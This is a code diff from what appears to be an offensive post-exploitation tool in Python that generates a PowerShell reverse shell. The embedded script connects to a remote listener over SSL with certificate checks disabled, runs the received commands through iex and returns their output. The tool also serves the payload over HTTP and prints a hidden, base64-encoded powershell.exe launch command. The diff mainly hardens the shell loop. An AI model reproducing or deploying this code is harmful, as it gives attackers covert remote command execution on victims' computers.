@@ -142,13 +142,13 @@ def printListener():
         "$b = New-Object Byte[] $c.ReceiveBufferSize;"
         "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
         "$sl.AuthenticateAsClient($env:computername);"
-        "while($c.Connected){"
+        "try{while(1){"
         "$i = $sl.Read($b, 0, $b.Length);"
+        "if ($i -lt 1){break}"
         "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i).replace(\"\x00\",\"\");"
-        "if($d.length -gt 0){"
         "$cb = (iex -c $d 2>&1 | Out-String);"
         "$br = $cb + ($error[0] | Out-String) + \"\x00\";$error.clear();"
-        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()}};break")
+        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()}}catch{exit}")
 
     FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), 'p.ps1', payloaddir(), port=8000, printIt = False)
     print 'powershell.exe -WindowStyle Hidden -NonInteractive -enc ' + windows_powershell_stager.encode('utf_16_le').encode('base64').replace('\n','')
